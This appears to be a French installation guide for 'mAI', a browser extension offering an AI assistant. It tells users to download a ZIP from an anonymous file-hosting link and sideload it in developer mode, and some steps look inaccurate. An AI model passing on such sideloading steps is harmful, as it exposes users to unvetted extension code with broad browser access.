# Guide d'installation Extension Navigateur 🌐⚡

L'extension **mAI pour Navigateur** vous permet d'accéder à votre assistant IA directement depuis n'importe quelle page web pour résumer des articles, répondre à vos questions et générer du contenu.

> [!NOTE]
> L'extension est compatible avec **tous les navigateurs modernes** (Chromium & Firefox), mais offre les meilleures performances et une intégration optimale sur **Microsoft Edge** et **Google Chrome**.

---

## 📥 1. Téléchargement

1. Téléchargez l'archive officielle de l'extension : [mAI-Web.zip](https://upload.fs.fr/Zn7FIHWR6M.zip).
2. **Conservez le fichier ZIP tel quel** sur votre disque dur (ou décompressez-le dans un dossier dédié si votre navigateur requiert un dossier non empaqueté).

---

## 🔧 2. Accès à la gestion des extensions

Ouvrez votre navigateur web et tapez l'adresse correspondant à votre navigateur dans la barre d'URL :
- **Google Chrome** : `chrome://extensions`
- **Microsoft Edge** : `edge://extensions`
- **Brave / Opera / Vivaldi** : `browser://extensions` ou `chrome://extensions`

---

## ⚙️ 3. Activation du Mode Développeur & Installation

1. Sur la page des extensions, activez l'interrupteur **"Mode développeur"** (Developer mode) situé généralement en haut à droite de la page.
2. Pour installer l'extension :
   - **Méthode 1 (Glisser-Déposer)** : Glissez-déposez directement le fichier ZIP (`Zn7FIHWR6M.zip`) sur la page des extensions.
   - **Méthode 2 (Charger l'extension non empaquetée)** : Cliquez sur le bouton **"Charger l'extension non empaquetée"** (Load unpacked) et sélectionnez le dossier décompressé de l'extension.
3. L'icône de l'extension **mAI** apparaîtra immédiatement dans la barre d'outils de votre navigateur !

---

## 💡 4. Lancement et utilisation

- Cliquez sur l'icône mAI dans la barre d'outils pour ouvrir l'interface latérale de l'assistant.
- Utilisez le raccourci `Alt + M` (ou `Option + M` sur Mac) pour ouvrir rapidement le prompt de commande mAI sur n'importe quel site web.
